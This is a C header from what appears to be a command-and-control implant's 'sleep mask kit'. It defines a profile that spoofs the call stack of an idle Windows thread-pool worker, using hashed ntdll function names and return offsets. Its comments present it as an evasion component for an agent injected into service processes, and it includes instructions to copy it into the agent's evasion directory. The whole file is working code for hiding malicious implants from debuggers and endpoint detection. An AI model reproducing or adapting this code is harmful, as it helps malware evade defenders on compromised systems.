/*
 * Starburst Sleep Mask Kit - Worker Thread Pool Profile (2-frame)
 *
 * Mimics the idle call stack of a Windows Thread Pool worker thread.
 * These threads are created internally by the NT thread pool (TppWorkerThread)
 * and are ubiquitous in modern Windows services and applications that use
 * the thread pool API (SubmitThreadpoolWork, CreateThreadpoolTimer, etc.).
 *
 * Spoofed stack (as seen by a debugger, top = innermost):
 *
 *   ntdll!TppWorkerThread+0x2f
 *   ntdll!RtlUserThreadStart+0x21
 *
 * Where you would see this pattern:
 *   - svchost.exe instances (most Windows services use thread pools)
 *   - .NET CLR worker threads
 *   - Background workers in any application using Win32 thread pool APIs
 *   - Good default when injected into a service process
 *
 * Usage: Copy this file to agent_code/include/evasion/spoof_profiles.h
 */

#ifndef STARBURST_EVASION_SPOOF_PROFILES_H
#define STARBURST_EVASION_SPOOF_PROFILES_H

#include <constexpr.h>
#include <stdint.h>

#define SPOOF_MAX_FRAMES 10

struct SPOOF_FRAME_DEF {
    uint32_t module_hash;
    uint32_t func_hash;
    uint32_t offset;
};

static inline void populate_spoof_frames(
    SPOOF_FRAME_DEF* frames, uint32_t* count
) {
    uint32_t i = 0;

    /*
     * Frame 0 (innermost): ntdll!TppWorkerThread+0x2f
     *
     * The main loop function for NT thread pool worker threads. When a
     * worker thread is idle and waiting for work items, the stack unwinds
     * to this function. The +0x2f offset is the return address after the
     * wait call inside the worker loop.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "TppWorkerThread" );
    frames[i].offset      = 0x2f;
    i++;

    /*
     * Frame 1 (outermost): ntdll!RtlUserThreadStart+0x21
     *
     * Standard thread entry point. Thread pool worker threads are still
     * user-mode threads and have RtlUserThreadStart at the bottom of
     * their call stack.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "RtlUserThreadStart" );
    frames[i].offset      = 0x21;
    i++;

    *count = i;
}

#endif /* STARBURST_EVASION_SPOOF_PROFILES_H */
